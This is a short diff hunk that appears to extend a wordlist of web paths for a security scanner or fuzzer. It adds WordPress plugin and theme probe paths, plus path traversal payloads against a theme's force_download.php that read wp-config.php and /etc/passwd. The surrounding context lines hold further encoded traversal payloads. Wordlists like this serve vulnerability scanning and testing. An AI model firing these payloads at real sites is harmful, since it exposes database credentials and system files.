@@ -705,3 +705,10 @@
 /application/..%252F..%252F..%252F..%252F..%252Fetc
 /application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
 /downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
+/wp-content/plugins/eventon-lite/readme.txt
+/wp-content/plugins/clean-login/readme.txt
+/?p={{postid}}
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
+/etc/passwd
